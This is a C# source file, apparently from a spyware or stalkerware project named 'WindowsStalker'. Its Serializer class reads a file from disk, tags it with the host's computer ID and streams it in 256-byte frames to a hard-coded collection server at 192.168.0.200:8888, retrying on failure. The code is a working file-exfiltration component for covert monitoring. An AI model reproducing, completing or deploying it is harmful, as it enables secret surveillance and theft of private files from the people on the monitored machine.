using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;

namespace WindowsStalker
{
    public class Serializer
    {
        private string _address = "192.168.0.200";
        private int _port = 8888;
        private const int _packetSize = 256;
        private Sender _sender;
        private int _attempts = 3;

        public void SendFile(string path, byte dataType)
        {
            for (int i = 0; i < _attempts; ++i)
            {
                List<byte[]> splitedFile = SplitFile(path, dataType);
                if (splitedFile != null)
                {
                    if (SendSplitedFile(splitedFile))
                    {
                        break;
                    }
                }
            }
            _sender.CloseConnection();
        }
        
        public List<byte[]> SplitFile(string path, byte dataType)
        {
            using(var fileStream = new FileStream(path, FileMode.Open))
            {
                List<byte[]> splitedFile = new List<byte[]>();
                var buffer = new byte[_packetSize];
                var bytesRead = 0;
                int framesCount = 0;
                int lastFrameSize = 0;
                while((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    if (bytesRead == _packetSize)
                    {
                        splitedFile.Add((byte[]) buffer.Clone());
                    }
                    else
                    {
                        lastFrameSize = bytesRead;
                        splitedFile.Add((byte[]) buffer.Clone());
                    }
                    framesCount++;
                }
                byte byteCount = (byte) (framesCount % _packetSize);
                byte byteCount2 = (byte) (framesCount/_packetSize);

                Console.WriteLine("frame count: " + framesCount);
                int filesize = byteCount + (byteCount2 * 256);
                Console.WriteLine("File size: " + filesize);

                List<byte[]> regFrames = GetRegisterFrames();

                byte[] firstFrame = {dataType, byteCount2, byteCount, (byte)lastFrameSize};
                splitedFile.Insert(0, firstFrame);
                splitedFile.InsertRange(0, regFrames);

                return splitedFile;
            }
        }

        public List<byte[]> Test()
        {
            List<byte[]> send = new List<byte[]>();
            byte[] frame = {1, 2, 3, 4};
            send.Add(frame);
            return send;
        }

        public List<byte[]> GetRegisterFrames()
        {
            List<byte[]> frames = new List<byte[]>();
            string id = Program.GetComputerID();
            byte[] frame = new byte[_packetSize];
            int length = id.Length;

            frame[0] = Convert.ToByte('w');
            for (int i = 1; i <= length; i++)
            {
                frame[i] = Convert.ToByte(id.ElementAt(i - 1));
            }

            byte[] regFrame = {0, 0, 1, (byte)(length + 1)};

            frames.Add(regFrame);
            frames.Add(frame);

            return frames;
        }

        public bool SendSplitedFile(List<byte[]> splitedFile)
        {
            _sender = new Sender(_address, _port);
            bool started = _sender.StartSender();
            if (!started)
            {
                Console.WriteLine("Connection not established");
                return false;
            }

            bool sent = true;
            int counter = 0;
            foreach (byte[] part in splitedFile)
            {
                sent = _sender.SendFrame(part);
                counter++;
                if(!sent) break;
            }
            if (sent)
            {
                Console.WriteLine("File sent!");
                return true;
            }
            Console.WriteLine("File file failed to sent!");
            Console.WriteLine("Packets send: " + counter);
            return false;
        }
    }
}